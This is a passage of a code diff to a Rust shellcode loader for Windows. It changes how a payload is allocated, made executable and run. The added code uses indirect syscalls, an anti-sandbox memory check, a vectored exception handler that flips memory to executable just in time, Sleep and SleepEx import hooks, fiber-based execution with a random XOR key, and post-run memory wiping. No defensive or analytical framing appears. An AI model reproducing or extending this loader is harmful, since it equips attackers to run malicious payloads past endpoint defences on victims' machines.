-                //     oa.Length = core::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
-                //     let mut cid = CLIENT_ID {
-                //         UniqueProcess: unsafe { GetCurrentProcessId() } as isize,
-                //         UniqueThread: 0,
-                //     };
-                //     let st_open = syscall(
-                //         ssn_open,
-                //         addr_open,
-                //         &mut process_handle as *mut _ as usize,
-                //         0x1FFFFF, // PROCESS_ALL_ACCESS
-                //         &mut oa as *mut _ as usize,
-                //         &mut cid as *mut _ as usize,
-                //         0, 0, 0, 0, 0, 0, 0,
-                //     );
-                //     println!("NtOpenProcess status: {:x}, handle: {:x}", st_open, process_handle);
-                // }
-
-                // if process_handle == 0 {
-                //     println!("Failed to open self, using -1");
-                //     process_handle = -1isize as usize as isize;
-                // }
                 let process_handle = -1isize as usize as isize;
 
-                // Get Kernel32 Base
                 let k32 = get_kernel32_base();
                 if k32 == 0 {
                     println!("Failed to find Kernel32");
                     return;
                 }
 
-                // Anti-Sandbox: Check Memory
                 use windows_sys::Win32::System::SystemInformation::{
                     GlobalMemoryStatusEx, MEMORYSTATUSEX,
                 };
@@ -1014,209 +1167,146 @@ fn main() {
                     return;
                 }
 
-                println!("Allocating memory via Dynamic VirtualAlloc...");
-                // base = unsafe { VirtualAlloc(core::ptr::null_mut(), size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) };
+                println!("Allocating memory via Indirect Syscall...");
 
-                let va_addr = get_export_addr(k32, HASH_VIRTUAL_ALLOC);
-                if let Some(addr) = va_addr {
-                    let va: FnVirtualAlloc = core::mem::transmute(addr);
-                    base = va(
-                        core::ptr::null_mut(),
-                        size,
-                        MEM_COMMIT | MEM_RESERVE,
-                        PAGE_READWRITE,
-                    );
+                let mut alloc_base: usize = 0;
+                let mut alloc_size = sc_len + 256 * 1024;
+
+                let status_alloc = syscall(
+                    ssn_alloc,
+                    addr_alloc,
+                    0xffffffffffffffff,                  // ProcessHandle (Current)
+                    &mut alloc_base as *mut _ as usize,  // *BaseAddress
+                    0,                                   // ZeroBits
+                    &mut alloc_size as *mut _ as usize,  // *RegionSize
+                    (MEM_COMMIT | MEM_RESERVE) as usize, // AllocationType
+                    PAGE_READWRITE as usize,             // Protect
+                    0,
+                    0,
+                    0,
+                    0,
+                    0,
+                );
+
+                if status_alloc == 0 {
+                    let offset = 32 * 1024;
+                    if offset + sc_len < alloc_size {
+                        base = (alloc_base as *mut u8).add(offset) as *mut core::ffi::c_void;
+                    } else {
+                        base = alloc_base as *mut core::ffi::c_void;
+                    }
                 }
 
                 println!("Alloc ptr: {:?}", base);
 
                 if !base.is_null() {
                     let dst = core::slice::from_raw_parts_mut(base as *mut u8, sc_len);
-                    // We can't copy directly if we are in another process context (but here we are local)
-                    // But if we use NtWriteVirtualMemory, we should use it for consistency
 
                     println!("Writing memory via memcpy...");
                     dst.copy_from_slice(sc);
                     println!("Write done");
 
-                    let mut old = 0;
-                    println!("Protecting memory via Dynamic VirtualProtect...");
-                    /*
-                                        // let res = unsafe { VirtualProtect(base, size, PAGE_EXECUTE_READWRITE, &mut old) };
-                                        let mut res = 0;
-                                        if let Some(addr) = unsafe { get_export_addr(k32, HASH_VIRTUAL_PROTECT) } {
-                                            let vp: FnVirtualProtect = unsafe { core::mem::transmute(addr) };
-                                            res = unsafe { vp(base, size, PAGE_EXECUTE_READWRITE, &mut old) };
-                                        }
-                    */
-                    let res = VirtualProtect(base, size, PAGE_EXECUTE_READWRITE, &mut old);
+                    // VEH-based Execution Evasion:
+                    // Do NOT set PAGE_EXECUTE_READ. Leave as PAGE_READWRITE.
+                    // Register VEH to handle execution violation (DEP) and flip to RX just-in-time.
 
-                    println!("Protect result: {}", res); // Debug print
-                    if res == 0 {
-                        use windows_sys::Win32::Foundation::GetLastError;
-                        println!("GetLastError: {}", GetLastError());
-                    }
-                    // let status_prot = if res != 0 { 0 } else { 1 };
-                    let status_prot = if res != 0 { 1 } else { 0 }; // VirtualProtect returns non-zero on success
+                    SC_ADDR = base as usize;
+                    SC_SIZE = sc_len;
+
+                    let veh_handle = AddVectoredExceptionHandler(1, Some(veh_guard));
+                    println!("VEH Registered: {:p}", veh_handle);
+
+                    // Skip explicit protection
+                    let res = 0;
+                    /*
+                    let mut old = 0;
+                    let mut prot_size = sc_len;
+                    let res = syscall(
+                        ssn_protect,
+                        addr_protect,
+                        0xffffffffffffffff,                      // ProcessHandle
+                        &mut (base as usize) as *mut _ as usize, // *BaseAddress
+                        &mut prot_size as *mut _ as usize,       // *RegionSize
+                        PAGE_EXECUTE_READ as usize,              // NewProtect
+                        &mut old as *mut _ as usize,             // *OldProtect
+                        0,
+                        0,
+                        0,
+                        0,
+                        0,
+                        0,
+                    );
+                    */
+
+                    let status_prot = if res == 0 { 1 } else { 0 };
 
                     if status_prot != 0 {
-                        SC_ADDR = base as usize;
-                        SC_SIZE = size;
                         if let Some(orig) = hook_iat("kernel32.dll", "Sleep", sleep_detour as usize)
                         {
                             SLEEP_ORIGINAL = orig;
-                            println!("IAT Hook installed");
                         }
-
-                        // Also hook KERNELBASE.dll Sleep if present (some programs link against it)
                         if let Some(orig) =
-                            hook_iat("KERNELBASE.dll", "Sleep", sleep_detour as usize)
+                            hook_iat("kernel32.dll", "SleepEx", sleep_ex_detour as usize)
                         {
-                            if SLEEP_ORIGINAL == 0 {
-                                SLEEP_ORIGINAL = orig;
-                            }
-                            println!("IAT Hook installed (KERNELBASE)");
+                            SLEEP_EX_ORIGINAL = orig;
                         }
 
-                        // Create a new thread to execute shellcode (more robust than fiber for generic payloads)
-                        /*
-                        let (ssn_create_thr, addr_create_thr) =
-                            get_ssn_indirect(HASH_NT_CREATE_THREAD_EX).unwrap_or((0xBD, 0));
-                        let (ssn_wait_thr, addr_wait_thr) =
-                            get_ssn_indirect(HASH_NT_WAIT_FOR_SINGLE_OBJECT).unwrap_or((0x4, 0));
-
-                        println!(
-                            "SSN CreateThread: {:x}, Addr: {:x}",
-                            ssn_create_thr, addr_create_thr
-                        );
-
-                        if addr_create_thr != 0 {
-                            let mut h_thread: isize = 0;
-                            println!("Creating thread...");
-                            let st_thr = syscall(
-                                ssn_create_thr,
-                                addr_create_thr,
-                                &mut h_thread as *mut _ as usize,
-                                0x1FFFFF,
-                                0,
-                                process_handle as usize,
-                                base as usize,
-                                0,
-                                0,
-                                0,
-                                0,
-                                0,
-                                0,
-                            );
-                            println!("CreateThread status: {:x}, handle: {:x}", st_thr, h_thread);
-                            if st_thr == 0 && h_thread != 0 {
-                                // Optionally wait for thread to finish briefly to ensure execution starts
-                                if addr_wait_thr != 0 {
-                                    println!("Waiting for thread...");
-                                    let _ = syscall(
-                                        ssn_wait_thr,
-                                        addr_wait_thr,
-                                        h_thread as usize,
-                                        0, // Alertable
-                                        0, // Timeout
-                                        0,
-                                        0,
-                                        0,
-                                        0,
-                                        0,
-                                        0,
-                                        0,
-                                        0,
-                                    );
-                                    println!("Thread finished or wait returned");
-                                } else {
-                                    println!("Wait syscall address is 0");
-                                }
-                                CloseHandle(h_thread);
-                            } else {
-                                println!("CreateThread failed");
-                            }
-                        } else {
-                            println!("CreateThread address is 0");
+                        println!("Executing via Fiber...");
+                        use rand::RngCore;
+                        let mut rng_key = [0u8; 1];
+                        rand::thread_rng().fill_bytes(&mut rng_key);
+                        ENC_KEY = rng_key[0];
+                        if ENC_KEY == 0 {
+                            ENC_KEY = 0xAA;
                         }
-                        */
-                        println!("Creating thread via Dynamic CreateThread...");
-                        let mut thread_id = 0;
-                        /*
-                        let h_thread = unsafe {
-                            CreateThread(
-                                core::ptr::null(),
-                                0,
-                                Some(core::mem::transmute(base)),
-                                core::ptr::null(),
-                                0,
-                                &mut thread_id
-                            )
-                        };
-                        */
-                        /*
-                        let mut h_thread = 0;
-                        if let Some(addr) = unsafe { get_export_addr(k32, HASH_CREATE_THREAD) } {
-                            let ct: FnCreateThread = unsafe { core::mem::transmute(addr) };
-                            h_thread = unsafe {
-                                ct(
-                                    core::ptr::null(),
-                                    0,
-                                    Some(core::mem::transmute(base)),
-                                    core::ptr::null_mut(),
-                                    0,
-                                    &mut thread_id,
-                                )
-                            };
-                        }
-                        */
-                        use windows_sys::Win32::System::Threading::CreateThread;
-                        let h_thread = CreateThread(
-                            core::ptr::null(),
-                            0,
-                            Some(core::mem::transmute(base)),
-                            core::ptr::null(),
-                            0,
-                            &mut thread_id,
-                        );
 
-                        SC_THREAD_ID = thread_id;
+                        let addr_convert = get_export_addr(k32, djb2(b"ConvertThreadToFiber"));
+                        let addr_create = get_export_addr(k32, djb2(b"CreateFiber"));
+                        let addr_switch = get_export_addr(k32, djb2(b"SwitchToFiber"));
 
-                        if h_thread != 0 {
-                            println!("Waiting for thread...");
-                            // unsafe { WaitForSingleObject(h_thread, INFINITE) };
-                            // Using Sleep in main thread allows testing if hook crashes it (if we used Sleep(5000))
-                            // But here we use WaitForSingleObject.
-                            // unsafe { WaitForSingleObject(h_thread, INFINITE) };
+                        if let (Some(a_conv), Some(a_create), Some(a_switch)) =
+                            (addr_convert, addr_create, addr_switch)
+                        {
+                            let convert: FnConvertThreadToFiber = core::mem::transmute(a_conv);
+                            let create: FnCreateFiber = core::mem::transmute(a_create);
+                            let switch: FnSwitchToFiber = core::mem::transmute(a_switch);
 
-                            // Let's just loop and check exit code to avoid WaitForSingleObject potentially blocking
+                            let main_fiber = convert(core::ptr::null_mut());
+                            MAIN_FIBER = main_fiber; // Store main fiber
 
-                            let sleep_addr = get_export_addr(k32, HASH_SLEEP);
+                            if !main_fiber.is_null() {
+                                let sc_fiber = create(0, fiber_start, base);
+                                if !sc_fiber.is_null() {
+                                    switch(sc_fiber);
 
-                            loop {
-                                let mut exit_code = 0;
-                                windows_sys::Win32::System::Threading::GetExitCodeThread(
-                                    h_thread,
-                                    &mut exit_code,
-                                );
-                                if exit_code != 259 {
-                                    // STILL_ACTIVE
-                                    break;
-                                }
-                                // Sleep 100ms, but we need to call original Sleep to avoid our hook?
-                                // Our hook only activates if thread ID matches SC_THREAD_ID.
-                                // We are in MAIN thread. So calling Sleep is SAFE.
-                                // unsafe { Sleep(100) };
-                                if let Some(addr) = sleep_addr {
-                                    let slp: FnSleep = core::mem::transmute(addr);
-                                    slp(100);
+                                    println!("Shellcode finished, cleaning up...");
+
+                                    let mut old_prot = 0;
+                                    let mut size = sc_len;
+                                    if SSN_PROTECT != 0 && ADDR_PROTECT != 0 {
+                                        syscall(
+                                            SSN_PROTECT,
+                                            ADDR_PROTECT,
+                                            0xffffffffffffffff,
+                                            &mut (base as usize) as *mut _ as usize,
+                                            &mut size as *mut _ as usize,
+                                            PAGE_READWRITE as usize,
+                                            &mut old_prot as *mut _ as usize,
+                                            0,
+                                            0,
+                                            0,
+                                            0,
+                                            0,
+                                            0,
+                                        );
+                                    } else {
+                                        VirtualProtect(base, size, PAGE_READWRITE, &mut old_prot);
+                                    }
+
+                                    core::ptr::write_bytes(base, 0, size);
+                                    println!("Memory wiped");
                                 }
                             }
-
-                            println!("Thread finished");
-                            CloseHandle(h_thread);
-                        } else {
-                            println!("CreateThread failed");
                         }
                     } else {
                         println!("Protect failed");
